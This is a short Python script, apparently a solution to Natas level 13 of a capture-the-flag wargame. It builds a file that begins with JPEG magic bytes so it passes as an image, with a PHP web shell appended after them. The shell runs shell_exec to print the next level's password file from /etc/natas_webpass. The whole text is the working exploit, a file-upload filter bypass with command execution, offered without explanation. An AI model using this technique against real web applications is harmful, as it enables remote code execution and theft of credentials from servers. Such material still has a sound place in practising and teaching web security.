fh = open('level13.php', 'wb')
php_payload = """<?php $output = shell_exec('cat /etc/natas_webpass/natas14'); echo "<pre>$output</pre>";?>"""
fh.write(b'\xFF\xD8\xFF\xDB'+ php_payload.encode())
fh.close()